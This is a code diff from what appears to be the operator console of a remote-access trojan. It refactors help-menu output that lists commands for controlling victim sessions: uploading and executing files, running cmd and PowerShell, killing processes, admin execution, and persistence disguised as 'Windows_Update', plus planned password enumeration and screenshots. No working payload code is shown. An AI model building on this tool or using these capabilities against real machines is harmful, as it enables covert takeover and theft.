@@ -2,66 +2,62 @@
 
 void Info::list_scripts()
 {
-	//SetColor(2);
-	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
-	std::cout << "[ You can enter : man <command> for more informations about a command" << std::endl;
-	std::cout << "[	Man is only for exploit for transfer scripts " << std::endl;
-	//SetColor(14);
-	std::cout << "#------------------------------ Folder action -----------------------------#" << std::endl;
-//	SetColor(6);
-	std::cout << "[ pwd\t\t\t\t\t: Print the current path" << std::endl;
-	std::cout << "[ ls\t\t\t\t\t: List all files and folders in the current directory" << std::endl;
-	std::cout << "[ getTemp\t\t\t\t: Get the location of the temp directory" << std::endl;
-	std::cout << "[ upload \"filename\"\t\t\t: Upload a file in the current directory" << std::endl;
-	std::cout << "[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory" << std::endl;
-	std::cout << "[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)" << std::endl;
-	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED" << std::endl;
-	//SetColor(14);
-	std::cout << "#----------------------------- System commands ----------------------------#" << std::endl;
-	//SetColor(6);
-	std::cout << "[ cd <directory>\t\t\t\t: Change directory" << std::endl;
-	std::cout << "[ ps\t\t\t\t\t: List all process with their PID and name" << std::endl;
-	std::cout << "[ kill -p <pid>\t\t\t\t: Kill a process by its PID" << std::endl;
-	std::cout << "[ kill -n <name>\t\t\t: Kill a process by its name" << std::endl;
-	std::cout << "[ self_persistence <keyname>\t\t: Put a persistence on the payload" << std::endl;
-	std::cout << "[ default name is Windows_Update" << std::endl;
-	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file in the current directory----NOT IMPLEMENTED" << std::endl;
-	std::cout << "[ default keyname is Windows_Update" << std::endl;
-	std::cout << "[ cmd <command>\t\t\t\t: Run a command using cmd" << std::endl;
-	std::cout << "[ powershell <command>\t\t\t:Run a command using powershell" << std::endl;
-	std::cout << "[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode" << std::endl;
-	std::cout << "[ exe <file_name>\t\t\t: Execute a file" << std::endl;
-	//SetColor(14);
-	std::cout << "#-------------------------------- Exploit ----------------------------------#" << std::endl;
-//	SetColor(6);
-	std::cout << "[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED" << std::endl;
-	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" << std::endl;
-	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED" << std::endl;
-	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
-	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;
+	print_done("[\t\t------------ List of all scripts ------------");
+	print_done("[ You can enter : man <command> for more informations about a command");
+	print_done("[	 Man is only for exploit for transfer scripts ");
 
-//	SetColor(7);
+	print_warning("#------------------------------ Folder action -----------------------------#");
+
+	print_status("[ pwd\t\t\t\t\t: Print the current path");
+	print_status("[ ls\t\t\t\t\t: List all files and folders in the current directory");
+	print_status("[ getTemp\t\t\t\t: Get the location of the temp directory");
+	print_status("[ upload \"filename\"\t\t\t: Upload a file in the current directory");
+	print_status("[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory");
+	print_status("[ download \"filename\"\t\t\t: Download a file located in the current directory (you can target an another using cd)");
+	print_status("[ download_dir \"filename\"\t\t: Download the target directory   ------NOT IMPLEMENTED");
+
+	print_warning("#----------------------------- System commands ----------------------------#");
+
+	print_status("[ cd <directory>\t\t\t\t: Change directory");
+	print_status("[ ps\t\t\t\t\t: List all process with their PID and name");
+	print_status("[ kill -p <pid>\t\t\t\t: Kill a process by its PID");
+	print_status("[ kill -n <name>\t\t\t\t: Kill a process by its name");
+	print_status("[ self_persistence <keyname>\t\t: Put a persistence on the payload");
+	print_status("[ default name is Windows_Update");
+	print_status("[ persistence <file_name> <keyname>\t\t: Put a persistence on a given file in the current directory----NOT IMPLEMENTED");
+	print_status("[ default keyname is Windows_Update");
+	print_status("[ cmd <command>\t\t\t\t: Run a command using cmd");
+	print_status("[ powershell <command>\t\t\t:Run a command using powershell");
+	print_status("[ exe_admin <file_name>\t\t\t: Execute a file (.exe) in admin mode");
+	print_status("[ exe <file_name>\t\t\t: Execute a file");
+
+	print_warning("#-------------------------------- Exploit ----------------------------------#");
+
+	print_status("[ geo\t\t\t\t: Give the localization of the current session------NOT IMPLEMENTED");
+	print_status("[ enum_web\t\t\t\t: enum all web passwords on the current session------NOT IMPLEMENTED" );
+	print_status("[ screenshot\t\t\t: Take a screenshot from the current target screen------NOT IMPLEMENTED");
+	print_status("[ ask <exe> <name>\t\t\t: Upload and execute a given file as administrator with a custom name");
+	print_status("[ you can choose a new file_name, default is Windows_Update.exe");
+
 }
 
 void Info::print_help()
 {
-//	SetColor(2)
-	std::cout << "[*] You have now acces to the payload\n" << std::endl;
-	std::cout << "[\t\t------------ List of Commands ------------\t\t]" << std::endl;
-	//SetColor(6);
-	std::cout << "[ help\t\t\t: list all commands" << std::endl;
-	std::cout << "[ man <command>\t\t: Give more informations about a command" << std::endl;
-	std::cout << "[Man is only for exploit and transfer scripts " << std::endl;
-	std::cout << "[ list_scripts\t\t: List all scripts available" << std::endl;
-	std::cout << "[ version\t\t: Print the current version and changes" << std::endl;
-	std::cout << "[ getcurrentsession\t: Print the information about the current session" << std::endl;
-	std::cout << "[ getsysinfo\t\t: Give information about the current session (user ...)" << std::endl;
-	std::cout << "[ getip\t\t\t: Give the External IP address of the current session" << std::endl;
-	std::cout << "[ set_session <nb_session>\t\t: Switch to an another session" << std::endl;
-	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
-	std::cout << "[ exit_session <number>\t: Exit a given session" << std::endl;
-	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
-//	SetColor(7);
+	print_done("[*] You have now acces to the payload\n");
+	print_done("[\t\t------------ List of Commands ------------\t\t]");
+
+	print_status("[ help\t\t\t: list all commands");
+	print_status("[ man <command>\t\t: Give more informations about a command");
+	print_status("[Man is only for exploit and transfer scripts ");
+	print_status("[ list_scripts\t\t: List all scripts available");
+	print_status("[ version\t\t: Print the current version and changes");
+	print_status("[ getcurrentsession\t: Print the information about the current session");
+	print_status("[ getsysinfo\t\t: Give information about the current session (user ...)");
+	print_status("[ getip\t\t\t: Give the External IP address of the current session");
+	print_status("[ set_session <nb_session>\t: Switch to an another session");
+	print_status("[ list\t\t\t: list all actives sessions");
+	print_status("[ exit_session <number>\t: Exit a given session");
+	print_status("[ exit\t\t\t: exit the program");
 }
 
  bool Info::set_session(Server* server,const std::string nb_session)
